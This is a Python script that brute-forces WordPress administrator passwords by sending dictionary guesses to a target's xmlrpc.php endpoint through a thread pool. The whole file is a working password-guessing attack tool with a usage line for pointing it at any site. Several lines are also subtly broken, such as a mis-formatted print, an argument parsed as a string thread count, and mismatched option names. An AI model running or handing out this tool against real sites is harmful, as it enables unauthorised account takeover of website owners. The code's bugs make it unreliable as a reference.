from sys import argv, exit
from concurrent.futures import ThreadPoolExecutor
import requests

def make_request(login, password, url):
    url += "/xmlrpc.php"
    payload = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value> <string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>" %(login, password)
    r = requests.post(url, data=payload)
    if "403" not in r.text:
        print("Password is found and was %s") %password
        print(r.text)
        exit(0)
    else:
        print("Password %s is invalid" %password)

def usage():
    print("Usage : %s -t http://target -l login -d dictionnary.txt [--threads number_of_threads]" %argv[0])
    return 0

def get_parameters():
    url = ""
    login = "admin"
    max_threads = 5
    dico_file = ""
    if "-t" not in argv or "-l" not in argv or "-d" not in argv:
        exit(usage())
    for param in argv:
        if param == "-t":
            if argv.index(param) + 2 > len(argv) or argv[argv.index(param) + 1][0] == '-':
                exit(usage())
            url = argv[argv.index(param) + 1]
        if param == "-l":
            if argv.index(param) + 2 > len(argv) or argv[argv.index(param) + 1][0] == '-':
                exit(usage())
            login = argv[argv.index(param) + 1]
        if param == "-d":
            if argv.index(param) + 2 > len(argv) or argv[argv.index(param) + 1][0] == '-':
                exit(usage())
            dico_file = argv[argv.index(param) + 1]
        if param == "--max-threads":
            if argv.index(param) + 2 > len(argv) or argv[argv.index(param) + 1][0] == '-':
                exit(usage())
            max_threads = argv[argv.index(param) + 1]    
    return url, login, max_threads, dico_file

def get_dico(dico_file):
    array = []
    with open(dico_file, "r") as f:
        for line in f.readlines():
            array.append(line.replace("\n", ""))
    return array

def main():
    url, login, max_threads, dico_file = get_parameters()
    for password in get_dico(dico_file):
        with ThreadPoolExecutor(max_workers=max_threads) as e:
            e.submit(make_request, login, password, url)
    return 0

if __name__ == "__main__":
    main()
